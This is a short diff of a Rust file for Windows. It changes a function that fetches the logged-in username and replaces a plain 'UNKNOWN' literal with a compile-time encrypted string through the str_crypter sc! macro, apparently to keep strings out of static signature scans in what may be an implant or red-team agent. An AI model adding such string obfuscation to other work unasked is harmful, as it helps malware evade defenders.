@@ -1,12 +1,8 @@
-use std::{
-    ffi::c_void,
-    fmt::Display,
-    mem::{MaybeUninit, transmute},
-    ptr::null_mut,
-};
+use std::{ffi::c_void, fmt::Display, mem::transmute, ptr::null_mut};
 
 use serde::Serialize;
 use shared::pretty_print::print_failed;
+use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::{
         Foundation::{GetLastError, HANDLE},
@@ -45,7 +41,7 @@ pub fn get_logged_in_username() -> Option<impl Serialize> {
     // Use the returned count of TCHARS (num chars not bytes) -1 for the null to get a String of the
     // username
     let un = if result == 0 || len == 0 {
-        "UNKNOWN".to_string()
+        sc!("UNKNOWN", 75).unwrap()
     } else {
         String::from_utf16_lossy(&buf[0..len as usize - 1])
     };
